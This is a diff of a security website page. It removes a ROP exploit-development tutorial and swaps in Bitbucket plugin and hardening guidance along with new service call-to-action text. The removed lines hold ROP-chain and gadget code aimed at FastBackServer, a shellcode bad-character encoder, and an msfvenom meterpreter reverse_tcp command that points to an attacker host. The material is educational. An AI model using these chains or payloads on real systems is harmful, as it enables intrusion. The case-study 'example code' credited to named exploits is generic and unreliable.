-    ropChain&#91;3] = NULL; // Old protection placeholder
-
-    // Call Sleep to suspend execution
-    ropChain&#91;4] = gadget2; // Address of Sleep
-    ropChain&#91;5] = 1000; // Sleep for 1000 ms
-
-    // Step 3: Execute the ROP chain
-    // This is where you would normally trigger the ROP chain execution.
-
-    // For demonstration, we will just call the functions directly
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], ropChain&#91;2], (PDWORD)ropChain&#91;3]);
-    Sleep(ropChain&#91;5]);
-    VirtualProtect((LPVOID)ropChain&#91;0], ropChain&#91;1], PAGE_READWRITE, (PDWORD)ropChain&#91;3]);
-
-    printf("Executed DeepSleep ROP Chain!\n");
 }</code></pre>
 
 
 
-<p class="wp-block-paragraph">While DeepSleep aims to evade detection, certain behaviors may still be flagged by security tools. For instance, calling <code>VirtualProtect()</code> repeatedly may leave traces in the call stack that security tools can identify. It&#8217;s crucial to continuously assess and adapt the technique to stay ahead of detection mechanisms.</p>
+<p class="wp-block-paragraph">Output Encoding:</p>
 
 
 
-<h3 class="wp-block-heading">ROPDecoder</h3>
+<p class="wp-block-paragraph">Ensure all outputs are properly encoded to prevent XSS attacks.</p>
 
 
 
-<p class="wp-block-paragraph">The <strong>ROPDecoder</strong> is essential in bypassing restrictions like <strong>Data Execution Prevention (DEP)</strong> when executing shellcode. It facilitates the modification of &#8220;bad characters&#8221; that can crash the exploit when executed. These bad characters typically include control characters and null bytes that disrupt the execution flow.</p>
+<p class="wp-block-paragraph">Use functions like HtmlUtils.htmlEscape to encode data.</p>
 
 
 
-<p class="wp-block-paragraph">by https://zeyadazima.com/exploit%20development/ropdecoder/</p>
+<pre class="wp-block-code"><code>String safeOutput = HtmlUtils.htmlEscape(inputString);</code></pre>
 
 
 
-<h4 class="wp-block-heading">Why Do We Need ROPDecoder?</h4>
+<p class="wp-block-paragraph">Bitbucket Plugin Development Guidelines:</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>Bad Character Issues</strong>: When using tools like <code>msfvenom</code>, bad characters are specified with the <code>-b</code> argument (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"</code>). The shellcode gets encoded to avoid these characters.</li>
+<p class="wp-block-paragraph">Follow the MVC Architecture:</p>
 
 
 
-<li><strong>WriteProcessMemory and Execution Permissions</strong>: The <code>WriteProcessMemory</code> API writes data to specified memory locations, which must be writable and executable. If the location has no execution permissions, attempts to decode bad characters can lead to access violations.</li>
-</ol>
+<p class="wp-block-paragraph">Separate the Model, View, and Controller to ensure clean and maintainable code.</p>
 
 
 
-<h4 class="wp-block-heading">Weaponizing with Gadgets</h4>
+<p class="wp-block-paragraph">Use Bitbucket API:</p>
 
 
 
-<p class="wp-block-paragraph">Using a target application like <strong>FastBackServer</strong> and analyzing its modules (e.g., <code>CSFTPAV6.dll</code>), we can find gadgets that perform necessary operations:</p>
+<p class="wp-block-paragraph">Leverage Bitbucket API for accessing built-in functionalities and objects.</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>Types of Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>add byte [reg]</code></li>
+<p class="wp-block-paragraph">Implement Descriptors:</p>
 
 
 
-<li><code>sub byte [reg]</code></li>
+<p class="wp-block-paragraph">Descriptors help in defining global configurations and settings.</p>
 
 
 
-<li>Bitwise operations (<code>ror</code>, <code>rol</code>, <code>shr</code>, <code>shl</code>, <code>or</code>, <code>and</code>)</li>
-</ul>
-</li>
+<pre class="wp-block-code"><code>@Extension
 
+public static final class DescriptorImpl extends Descriptor&lt;Builder> {
 
+    public boolean isApplicable(Class&lt;? extends AbstractProject> aClass) {
 
-<li><strong>Example Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>0x5050626e: add byte [esi+0x3B], ah ; ret ;</code> (decoding gadget)</li>
-</ul>
-</li>
-</ol>
+        return true;
 
+    }
 
+    public String getDisplayName() {
 
-<h4 class="wp-block-heading">Steps for ROP Decoding</h4>
+        return "My Plugin Name";
 
+    }
 
+}
 
-<p class="wp-block-paragraph">To decode bad characters using the identified gadgets, follow these steps:</p>
+Define Configurations:
 
+Use config.jelly to define the configuration options in the UI.
 
+&lt;j:jelly xmlns:j="jelly:core" xmlns:f="/lib/form">
 
-<ol class="wp-block-list">
-<li><strong>Make <code>esi + 0x3B</code> Point to the Bad Character</strong>:
-<ul class="wp-block-list">
-<li>Use gadgets to calculate the correct pointer.</li>
-</ul>
-</li>
+    &lt;f:entry title="Parameter" field="parameter">
 
+        &lt;f:textbox />
 
+    &lt;/f:entry>
 
-<li><strong>Pop the Decoding Value into <code>eax</code></strong>:
-<ul class="wp-block-list">
-<li>This value is used to add to the memory location where the bad character resides.</li>
-</ul>
-</li>
+&lt;/j:jelly>
 
+Handle Build Steps:
 
+Implement classes to define actions to be taken during a build step.
 
-<li><strong>Execute the Decoding Gadget</strong>:
-<ul class="wp-block-list">
-<li>Use the <code>add</code> instruction to modify the byte at the location pointed to by <code>esi</code>.</li>
-</ul>
-</li>
-</ol>
+public class MyBuilder extends Builder {
 
+    private final String parameter;
 
+    @DataBoundConstructor
 
-<h4 class="wp-block-heading">Example ROP Decoder Code</h4>
+    public MyBuilder(String parameter) {
 
+        this.parameter = parameter;
 
+    }
 
-<p class="wp-block-paragraph">Here&#8217;s an example of how to construct the ROP chain for decoding bad characters.</p>
+    @Override
 
+    public boolean perform(AbstractBuild&lt;?, ?> build, Launcher launcher, BuildListener listener) {
 
+        // Build step actions here
 
-<pre class="wp-block-code"><code>from struct import pack
+        return true;
 
-# ROP Decoder Construction
-ROPDecoder = b""
-ROPDecoder += pack("&lt;L", 0x5050118e)  # mov eax, esi ; pop esi ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop esi
-ROPDecoder += pack("&lt;L", 0x5052db24)  # pop ecx ; ret ;
-ROPDecoder += pack("&lt;L", negative_offset_value_to_shellcode)  # negative offset
-ROPDecoder += pack("&lt;L", 0x50533bf4)  # sub eax, ecx ; ret ;
-ROPDecoder += pack("&lt;L", 0x505263f9)  # push eax ; pop esi ; pop ebx ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop ebx
-ROPDecoder += pack("&lt;L", 0x5053a0f5)  # pop eax ; ret ;
-ROPDecoder += pack("&lt;L", decoding_value)  # decoding value
-ROPDecoder += pack("&lt;L", 0x5050626e)  # add byte &#91;esi+0x3B], ah ; ret ;</code></pre>
+    }
 
+}</code></pre>
 
 
-<h4 class="wp-block-heading">Encoding and Decoding Process</h4>
 
+<p class="wp-block-paragraph">Manage Plugin Dependencies:</p>
 
 
-<ol class="wp-block-list">
-<li><strong>Encoding</strong>: Replace each bad character in the shellcode with an alternate value.
-<ul class="wp-block-list">
-<li>Example: Replace <code>0x00</code> with <code>0xfd</code>, <code>0x0a</code> with <code>0x05</code>, etc.</li>
-</ul>
-</li>
 
+<p class="wp-block-paragraph">Ensure your pom.xml correctly defines all dependencies and Bitbucket version.</p>
 
 
-<li><strong>Decoding</strong>: Revert the encoded bad characters back to their original values during execution using the ROP chain.</li>
-</ol>
 
+<p class="wp-block-paragraph">&lt;dependencies&gt;</p>
 
 
-<pre class="wp-block-code"><code>def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode)
 
-# Example of usage
-with open("shellcode.txt", "r") as file:
-    my_shellcode = file.read()
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&lt;dependency&gt;</p>
 
-badchars = &#91;"00", "09", "0a", "0b", "0c", "0d", "20"]
-encoded_shellcode = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)</code></pre>
 
 
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.atlassian.bitbucket.server&lt;/groupId&gt;</p>
 
-<h4 class="wp-block-heading">Automating the Process</h4>
 
 
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;bitbucket-api&lt;/artifactId&gt;</p>
 
-<p class="wp-block-paragraph">To fully automate encoding and decoding, implement functions that handle both tasks. Here&#8217;s an advanced version of the encoding function:</p>
 
 
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;7.0.0&lt;/version&gt;</p>
 
-<pre class="wp-block-code"><code>from struct import pack
 
-def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    bad_index = &#91;]
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-                bad_index.append(index)
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode), bad_index
 
-# Example of usage
-encoded_shellcode, bad_indices = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)
-print("&#91;+] Bad Indices:", bad_indices)</code></pre>
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;scope&gt;provided&lt;/scope&gt;</p>
 
 
 
-<h4 class="wp-block-heading"><strong><em>Tooling and Exploitation Frameworks</em></strong></h4>
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Tools for Finding and Using ROP Gadgets:</em></strong></p>
+<p class="wp-block-paragraph">&lt;/dependencies></p>
 
 
 
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget:</em></strong></li>
-</ol>
+<h2 class="wp-block-heading">Conclusion:</h2>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> ROPgadget scans binaries for ROP gadgets and lists them for use in constructing exploits.</p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ROPgadget --binary your_binary_file --all</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Lists all gadgets in the binary, including addresses and instructions. You can filter gadgets based on specific criteria.</p>
-
-
-
-<ol start="2" class="wp-block-list">
-<li><strong><em>Ropper:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> Ropper is a tool for finding and analyzing ROP gadgets, and supports various architectures.</p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ropper --file your_binary_file --find 'pop rdi; ret'</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Allows for detailed gadget listing and filtering, useful for constructing specific ROP chains.</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget.py:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Overview:</em></strong> ROPgadget.py is a Python script version of ROPgadget, offering similar functionalities for gadget discovery and analysis.</p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Command Example:</em></strong></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>python ROPgadget.py --binary your_binary_file --all</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Features and Functionalities:</em></strong> Provides detailed gadget information and can be integrated into custom scripts for automated exploitation.</p>
-
-
-
-<h3 class="wp-block-heading">Practical Applications and Case Studies</h3>
-
-
-
-<h4 class="wp-block-heading">Real-World Examples:</h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>1. Notable Exploits Utilizing ROP:</em></strong></p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>1.1. The &#8220;Zerodium iOS 10.3.3 Exploit&#8221;:</em></strong> In 2017, a zero-day exploit targeting iOS 10.3.3 involved a ROP-based attack. The vulnerability in the kernel allowed an attacker to escalate privileges and execute arbitrary code. The exploit utilized ROP to bypass ASLR and DEP protections. An example ROP chain used in this exploit might look like:</p>
-
-
-
-<pre class="wp-block-code"><code>1. Pop address of kernel function into register&amp;nbsp;
-
-2. Execute kernel function with controlled parameters&amp;nbsp;
-
-3. Return to controlled location</code></pre>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi (used for kernel function address)&amp;nbsp;
-
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
-
-mov rax, &#91;rdi] &amp;nbsp; ; Load kernel function address from rdi into rax&amp;nbsp;
-
-call rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call the kernel function</code></pre>
-
-
-
-<p class="wp-block-paragraph">By chaining gadgets like these, the attacker could control kernel execution flow and exploit the vulnerability.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>1.2. The &#8220;Microsoft Internet Explorer 9&#8221; Exploit (CVE-2014-6332):</em></strong> This vulnerability allowed remote code execution through Internet Explorer 9. Exploiting it required bypassing security features with ROP. Attackers utilized ROP to create a chain of gadgets that manipulated memory and executed arbitrary code.</p>
-
-
-
-<pre class="wp-block-code"><code>mov rbx, &#91;rsp + 8] ; Move address into rbx&amp;nbsp;
-
-pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop value into rdi&amp;nbsp;
-
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
-
-mov &#91;rbx], rdi &amp;nbsp; &amp;nbsp; ; Store value from rdi to address in rbx&amp;nbsp;
-
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction`</code></pre>
-
-
-
-<p class="wp-block-paragraph">The gadgets were carefully selected and combined to perform actions that could bypass IE&#8217;s security features.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Case Studies Demonstrating the Effectiveness of ROP:</em></strong></p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>2.1. Case Study: &#8220;Google Chrome Zero-Day Exploit&#8221; (CVE-2018-6177):</em></strong> In 2018, a zero-day vulnerability in Google Chrome was exploited using ROP. The attack involved a ROP chain that bypassed Chrome’s ASLR by exploiting a memory corruption bug. The ROP chain used gadgets to pivot the stack and manipulate memory to execute malicious payloads.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi&amp;nbsp;
-
-ret &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
-
-mov &#91;rbx], rdi&amp;nbsp; &amp;nbsp; ; Write value from rdi to memory at address in rbx&amp;nbsp;
-
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop another value into rax (e.g., function pointer) call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call function at address in rax</code></pre>
-
-
-
-<p class="wp-block-paragraph">By chaining these gadgets, the exploit successfully bypassed Chrome&#8217;s security measures.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>2.2. Case Study: &#8220;Ubuntu Linux Kernel Exploit&#8221;:</em></strong> An exploit targeting the Ubuntu Linux kernel used ROP to bypass security features. The attacker used a ROP chain to manipulate kernel data structures and escalate privileges.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to set up rdi with an address&amp;nbsp;
-
-mov rsi, rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; ; Move address to rsi&amp;nbsp;
-
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Load kernel function pointer into rax&amp;nbsp;
-
-call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel function</code></pre>
-
-
-
-<p class="wp-block-paragraph">This case study highlights how ROP can be used to bypass kernel protections and escalate privileges.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Analysis of Effectiveness:</em></strong> These examples and case studies demonstrate how ROP can be employed to bypass security mechanisms such as DEP and ASLR. By leveraging existing code snippets within the binary, attackers can craft sophisticated exploits that evade traditional defenses.</p>
-
-
-
-<h4 class="wp-block-heading">Advanced ROP</h4>
-
-
-
-<p class="wp-block-paragraph">One notable example is the &#8220;Spectre&#8221; vulnerability disclosed in 2018. While primarily related to speculative execution in CPUs, some attacks demonstrated ROP techniques to extract sensitive information from memory, effectively bypassing security measures like address space layout randomization (ASLR) and data execution prevention (DEP).</p>
-
-
-
-<p class="wp-block-paragraph">Additionally, the &#8220;CVE-2021-1732&#8221; vulnerability in Windows highlighted ROP&#8217;s effectiveness in privilege escalation. Attackers were able to construct ROP chains that exploited the vulnerability, allowing them to execute arbitrary code in kernel mode, illustrating the technique&#8217;s potency even against hardened operating systems.</p>
-
-
-
-<h3 class="wp-block-heading">Security Researcher</h3>
-
-
-
-<p class="wp-block-paragraph"><a href="https://www.linkedin.com/in/ACoAACMUPk8BjjkCwMk2KYJZ3WNyiTYgjXAzmgk">Amirhossein Gholizadeh</a>,&nbsp;<a href="https://www.linkedin.com/in/ACoAADZqFYEBRzUOWIJMQWUgqHHfNHf0tydlb4U">Surya Dev Singh</a></p>
-
-
-
-<p class="wp-block-paragraph">Cover by <strong>@mercuriorojo</strong></p>
+<p class="wp-block-paragraph">Bitbucket, while providing a robust platform for code management and collaboration, also presents various attack vectors and surfaces that need to be secured and monitored. Organizations must employ a defense-in-depth strategy, ensuring that each attack surface is secured, and potential vectors are mitigated. Regular audits, monitoring, and employing security best practices are pivotal in safeguarding the environment against sophisticated APTs.</p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -3022,27 +2531,27 @@ call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel fun
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -3165,11 +2674,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -3192,59 +2701,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
